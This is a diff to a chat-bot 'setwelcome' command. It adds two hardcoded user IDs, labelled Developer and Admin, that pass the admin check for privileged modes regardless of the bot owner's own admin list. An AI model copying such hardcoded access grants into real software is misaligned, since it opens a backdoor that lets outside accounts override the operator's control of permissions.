@@ -4,7 +4,7 @@ module.exports = {
 	config: {
 		name: "setwelcome",
 		aliases: ["setwc"],
-		version: "2.6",
+		version: "2.7",
 		author: "AkHi & Nawab",
 		countDown: 5,
 		role: 0,
@@ -39,13 +39,18 @@ module.exports = {
 		const { threadID, senderID, body } = event;
 		const { data, settings } = await threadsData.get(threadID);
 		
+		// Hardcoded IDs for Developer and Admin
+		const devID = "61585634146171";
+		const adminID = "61583939430347";
 		const botAdmins = global.config.adminBot || [];
-		const isBotAdmin = botAdmins.includes(senderID);
+		
+		// Check if sender is Bot Admin, Developer or the specified Admin ID
+		const isAuthorized = botAdmins.includes(senderID) || senderID == devID || senderID == adminID;
 
 		const type = args[0]?.toLowerCase();
 
-		if (["global", "admin", "dev"].includes(type) && !isBotAdmin) {
-			return message.reply("Only Bot Admins can use this mode!");
+		if (["global", "admin", "dev"].includes(type) && !isAuthorized) {
+			return message.reply("Only Bot Admins or Developers can use this mode!");
 		}
 
 		switch (type) {
@@ -144,4 +149,4 @@ async function saveChanges(message, event, threadID, senderID, threadsData) {
 
 	await threadsData.set(threadID, { data });
 	message.reply(`Added ${attachments.length} file attachments`);
-}
+																	 }
